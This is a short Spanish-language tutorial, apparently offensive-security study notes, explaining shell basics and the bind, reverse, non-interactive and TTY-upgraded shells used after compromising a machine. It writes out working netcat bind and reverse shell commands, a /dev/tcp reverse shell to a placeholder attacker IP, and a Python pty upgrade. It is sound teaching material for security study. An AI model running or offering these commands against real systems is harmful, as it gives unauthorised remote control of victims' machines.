# SHELL
Un shell es una interfaz que te permite interactuar con el sistema operativo mediante comandos.

Piensa en el shell como:
  * Un intérprete (traduce lo que escribes al sistema)
  * O una terminal de control

### Revisar Shell
Saber que shell estás usando
```bash
echo $SHELL
```
También:
```bash
ps -p $$
```

> Te dirá si estás en bash, sh, zsh, etc.


### Ver shells disponibles
```bash
cat /etc/shells
```

## TIPOS DE SHELL

### 1.  Bind Shell
La máquina víctima **abre un puerto** y tú te conectas a ella.

Idea:
  * Víctima: “Estoy escuchando en este puerto”
  * Atacante: “Me conecto”

La víctima hace algo como:
```bash
nc -lvnp 4444 -e /bin/bash
```
Tú te conectas
```bash
nc IP_VÍCTIMA> 4444
```

Problema:
  * Puede fallar por firewall (puertos bloqueados)

### 2. Reverse Shell 
La víctima se conecta a ti

Idea:
  * Atacante: “Estoy escuchando”
  * Víctima: “Me conecto hacia ti”

Tú:
```bash
nc -lnp 4444
```
Víctima
```bash
nc <TU_IP> 4444 -e /bin/bash
```
Por qué es mejor:
  * Evita firewalls (la conexión sale desde la víctima)
  * Es el más usado en la vida real


### 3. Shell no interactiva
Funciona, pero es limitada podemos comprobar con `echo $0` y `tty` si la salida algo como `not a tty` es una shell limitada.

Ejemplo:
```bash
bash -i >& /dev/tcp/TU_IP/4444 0>&1
```
Problemas:
  * No puedes usar bien `nano`, `vim`, `su`
  * No hay autocompletado


### 4. TTY Shell (shell interactiva mejorada)
Convierte una shell básica en una “real”

Ejemplo:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Luego: 
```bash
export TERM=xterm
```
Y mejoras con:
```bash
stty raw -echo 
```

### Resumen
  * Bind shell → tú te conectas
  * Reverse shell → la víctima se conecta (la más usada)
  * Shell básica → limitada
  * TTY shell → mejorada/interactiva
